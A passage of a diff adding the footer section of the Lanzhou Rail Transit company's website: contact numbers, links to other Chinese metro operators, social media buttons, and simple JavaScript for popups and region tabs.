+                               <!-- <a href="rzsq.jsp?cId=11112">-->
+                                    <h4>轨交路衍经济</h4>
+                                     <h9> 西客站北广场、奥体中心、迎门滩站地铁商业
+                                      <p> 咨询热线 0931-8629999转12061</p></h9>
+                               
+                            </li>
+                            <li class="four">
+                                 <h4>轨交建设工程</h4>
+                                <span>0931-8629999转12383</span>
+                            </li>
+                            <li class="five">
+                                <h4>轨交工程管理</h4>
+                                <span>0931-8629999转12371</span>
+                            </li>
+                            <li class="six">
+                               <h4>东恒房地产开发</h4>
+                                <span>0931-4636892</span>
+                            </li>
+                        </ul>
+                    </div>
+                    <!--漂浮广告-->
+
+
+                    <!--  -->
+                    <!-- 漂浮广告 -->
+
+
+
+
+
+                </div>
+            </div>
+            <!-- 漂浮广告 -->
+            <div id="floadAD" class="floadAd">
+                
+            </div>
+          
+            <!--引入底部-->
+            
+    
+
+
+        <div class="footer">
+            <div class="center">
+                <div class="region-container">
+                    <div class="fixed-nav">
+                        <div class="nav-icon"></div>行业导航
+                    </div>
+
+                    <div class="region-tabs">
+                        <button class="region-btn" data-region="northeast">
+                            东北地区 <span class="arrow">∨</span>
+                        </button>
+                        <button class="region-btn" data-region="northchina">
+                            华北地区 <span class="arrow">∨</span>
+                        </button>
+                        <button class="region-btn" data-region="eastchina">
+                            华东地区 <span class="arrow">∨</span>
+                        </button>
+                        <button class="region-btn" data-region="centralchina">
+                            华中地区 <span class="arrow">∨</span>
+                        </button>
+                        <button class="region-btn" data-region="southchina">
+                            华南地区 <span class="arrow">∨</span>
+                        </button>
+                        <button class="region-btn" data-region="southwestchina">
+                            西南地区 <span class="arrow">∨</span>
+                        </button>
+                        <button class="region-btn" data-region="northwestchina">
+                            西北地区 <span class="arrow">∨</span>
+                        </button>
+                        <button class="region-btn" data-region="hktw">
+                            港澳台地区 <span class="arrow">∨</span>
+                        </button>
+                    </div>
+
+                    <!-- 东北地区内容 -->
+                    <div class="region-content" id="northeast_content">
+                        <a class="city-link" target="_blank" href="https://www.symtc.com/index">沈阳地铁</a>
+                        <a class="city-link" target="_blank" href="http://www.ccqg.com/">长春轨道交通</a>
+                        <a class="city-link" target="_blank" href="https://www.dlmetro.com/portal/indexShow.do">大连地铁</a>
+                    </div>
+
+                    <!-- 华北地区内容 -->
+                    <div class="region-content" id="northchina_content">
+                        <a class="city-link" target="_blank" href="https://www.bjsubway.com/">北京地铁</a>
+                        <a class="city-link" target="_blank" href="http://www.tjgdjt.com/index.htm">天津轨道交通</a>
+                        <a class="city-link" target="_blank" href="https://www.tymetro.ltd/">太原地铁</a>
+                        <a class="city-link" target="_blank" href="http://www.sjzmetro.cn/index.html">石家庄地铁</a>
+                        <a class="city-link" target="_blank" href="http://www.hhhtmetro.com/org/platform">呼和浩特地铁</a>
+                    </div>
+
+                    <!-- 华东地区内容 -->
+                    <div class="region-content" id="eastchina_content">
+                        <a class="city-link" target="_blank" href="http://www.shmetro.com/">上海地铁</a>
+                        <a class="city-link" target="_blank"
+                            href="https://www.njmetro.com.cn/njdtweb/home/go-dtmain.do">南京地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.sz-mtr.com/">苏州轨道交通</a>
+                        <a class="city-link" target="_blank" href="https://www.wxmetro.net/wxmetro/home">无锡地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.xzdtjt.com/index.html">徐州地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.czmetro.net.cn/Html/index.html">常州地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.ntrailway.com/">南通轨道交通</a>
+                        <a class="city-link" target="_blank" href="https://www.hzmetro.com/">杭州地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.nbmetro.com/">宁波轨道交通</a>
+                        <a class="city-link" target="_blank" href="https://www.wzmtr.com/">温州轨道交通</a>
+                        <a class="city-link" target="_blank" href="https://www.hfgdjt.com/">合肥轨道交通</a>
+                        <a class="city-link" target="_blank" href="http://www.fzmtr.com/">福州地铁</a>
+                        <a class="city-link" target="_blank" href="http://www.xmgdjt.net/">厦门地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.ncmtr.com/">南昌地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.jngdjt.cn/">济南轨道交通</a>
+                        <a class="city-link" target="_blank" href="http://www.qd-metro.com/">青岛地铁</a>
+                    </div>
+
+                    <!-- 华中地区内容 -->
+                    <div class="region-content" id="centralchina_content">
+                        <a class="city-link" target="_blank" href="https://www.zzmetro.cn/">郑州轨道</a>
+                        <a class="city-link" target="_blank" href="https://www.lysubway.com.cn/index.html">洛阳轨道</a>
+                        <a class="city-link" target="_blank" href="https://www.wuhanrt.com/public_forward.aspx">武汉地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.hncsmtr.com/">长沙轨道交通</a>
+                    </div>
+
+                    <!-- 华南地区内容 -->
+                    <div class="region-content" id="southchina_content">
+                        <a class="city-link" target="_blank" href="https://www.gzmtr.com/">广州地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.szmc.net/">深圳地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.fmetro.net/">佛山地铁</a>
+                        <a class="city-link" target="_blank" href="http://www.dggdjt.com/">东莞轨道交通</a>
+                        <a class="city-link" target="_blank" href="http://www.nngdjt.com/index.html">南宁轨道交通</a>
+                    </div>
+
+                    <!-- 西南地区内容 -->
+                    <div class="region-content" id="southwestchina_content">
+                        <a class="city-link" target="_blank" href="http://www.cdmetro.cn/">成都地铁</a>
+                        <a class="city-link" target="_blank" href="https://www.cqmetro.cn/">重庆轨道交通</a>
+                        <a class="city-link" target="_blank" href="http://www.kmgdgs.com/">昆明轨道交通</a>
+                        <a class="city-link" target="_blank" href="https://www.gyurt.com/">贵阳轨道交通</a>
+                    </div>
+
+                    <!-- 西北地区内容 -->
+                    <div class="region-content" id="northwestchina_content">
+                        <a class="city-link" target="_blank" href="https://www.xianrail.com/#/index">西安地铁</a>
+                    </div>
+
+                    <!-- 港澳台地区内容 -->
+                    <div class="region-content" id="hktw_content">
+                        <a class="city-link" target="_blank" href="http://www.mtr.com.hk/">香港地铁</a>
+                        <a class="city-link" target="_blank" href="https://m.metro.taipei/">台北捷运</a>
+                        <a class="city-link" target="_blank" href="http://www.krtco.com.tw/">高雄捷运</a>
+                    </div>
+                </div>
+
+                <div class="info">
+                    <div class="infoL">
+                        <ul>
+                            <li>电话：0931-5161111</li>
+                            <li>传真：0931-4631178</li>
+                            <li>邮编：730030</li>
+                            <li>地址：兰州市城关区东岗东路55号</li>
+                        </ul>
+                    </div>
+                    <div class="infoM">
+                        <ul>
+                            <li>
+                                <a onclick="weChatImg()">
+                                    <span class="wx"></span>
+                                    <p>官方微信</p>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="http://weibo.com/u/5852537805" target="target=" _blank"">
+                                    <span class="wb"></span>
+                                    <p>官方微博</p>
+                                </a>
+                            </li>
+                            <li>
+                                <a onclick="dyImg()">
+                                    <span class="dy"></span>
+                                    <p>官方抖音</p>
+                                </a>
+                            </li>
+                            <li>
+                                <a onclick="sphImg()">
+                                    <span class="sph"></span>
+                                    <p>官方视频号</p>
+                                </a>
+                            </li>
+                            <li>
+                                <a onclick="bzImg()">
+                                    <span class="bz"></span>
+                                    <p>官方B站</p>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://www.toutiao.com/c/user/token/MS4wLjABAAAABdEODhbrdgRwureQ2aoVxYKkIocJDSxhUG5YLyMGhOY/"
+                                    target="target=" _blank"">
+                                    <span class="tt"></span>
+                                    <p>今日头条</p>
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="infoR">
+                        <img src="https://www.lzgdjt.com/lzgd/template/img/ewm-icon.png" alt="">
+                        <p>兰州轨道APP</p>
+                    </div>
+                </div>
+                <div class="copyright">
+                    <p>Copyright © 2016兰州市轨道交通有限公司 版权所有 All Rights Reserved. <a href="https://beian.miit.gov.cn/"
+                            target="target=" _blank"">陇ICP备13000617号-1</a></p>
+                    <p>技术支持: 兰州轨交数字科技有限公司 甘公网安备 62010002000140号</p>
+                </div>
+            </div>
+
+            <div id="weChatImg" style="display: none;"><img src="https://www.lzgdjt.com/lzgd/template/images/weChatImg.png"></div>
+            <div id="sphImg" style="display: none;"><img src="https://www.lzgdjt.com/lzgd/template/images/sph.png"></div>
+            <div id="bzImg" style="display: none;"><img src="https://www.lzgdjt.com/lzgd/template/images/bz.png"></div>
+            <div id="dyImg" style="display: none;"><img src="https://www.lzgdjt.com/lzgd/template/images/dy.png"></div>
+
+        </div>
+        <script type="text/javascript">
+            function weChatImg() {
+                layer.open({
+                    type: 1,
+                    title: false,
+                    closeBtn: 0,
+                    area: '154px 154px',
+                    skin: 'layui-layer-nobg',
+                    shadeClose: true,
+                    content: $('#weChatImg')
+                });
+            }
+
+            function sphImg() {
+                layer.open({
+                    type: 1,
+                    title: false,
+                    closeBtn: 0,
+                    area: '154px 154px',
+                    skin: 'layui-layer-nobg',
+                    shadeClose: true,
+                    content: $('#sphImg')
+                });
+            }
+          
+            function bzImg() {
+                layer.open({
+                    type: 1,
+                    title: false,
+                    closeBtn: 0,
+                    area: '154px 154px',
+                    skin: 'layui-layer-nobg',
+                    shadeClose: true,
+                    content: $('#bzImg')
+                });
+            }
+
+            function dyImg() {
+                layer.open({
+                    type: 1,
+                    title: false,
+                    closeBtn: 0,
+                    area: '152px 152px',
+                    skin: 'layui-layer-nobg',
+                    shadeClose: true,
+                    content: $('#dyImg')
+                });
+            }
+
+        </script>
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                let currentActiveButton = null;
+
+                document.querySelectorAll('.region-btn').forEach(button => {
+                    button.addEventListener('click', function () {
+                        const region = this.getAttribute('data-region');
+                        // 使用字符串拼接替代模板字符串
+                        const content = document.getElementById(region + '_content');
+
+                        if (!content) {
+                            console.error(`Content element not found for region: `);
+                            console.log('Available IDs:', Array.from(document.querySelectorAll('[id]')).map(el => el.id));
+                            return;
+                        }
+
+                        if (currentActiveButton === this) {
+                            content.style.display = 'none';
+                            this.classList.remove('active');
+                            currentActiveButton = null;
+                        } else {
+                            document.querySelectorAll('.region-content').forEach(c => {
+                                c.style.display = 'none';
+                            });
+
+                            content.style.display = 'flex';
+
+                            document.querySelectorAll('.region-btn').forEach(btn => {
+                                btn.classList.remove('active');
+                            });
+
+                            this.classList.add('active');
+                            currentActiveButton = this;
+                        }
+                    });
+                });
+            });
+        </script>
+
+        </body>
+        <script type="text/javascript" src="https://www.lzgdjt.com/lzgd/template/js/jquery-3.3.1.min.js"></script>
+        <script type="text/javascript" src="https://www.lzgdjt.com/lzgd/template/js/swiper.min.js"></script>
+        <script type="text/javascript" src="https://www.lzgdjt.com/lzgd/template/js/layer/layer.js"></script>
+        <script type="text/javascript" src="https://www.lzgdjt.com/lzgd/template/js/public.js"></script>
+        <!-- 广告漂浮 -->
+        <script type="text/javascript" src="https://www.lzgdjt.com/lzgd/template/js/sus.js"></script>
+        <script type="text/javascript" src="https://www.lzgdjt.com/lzgd/template/js/index_main.js"></script>
+
+
+
+        </html>
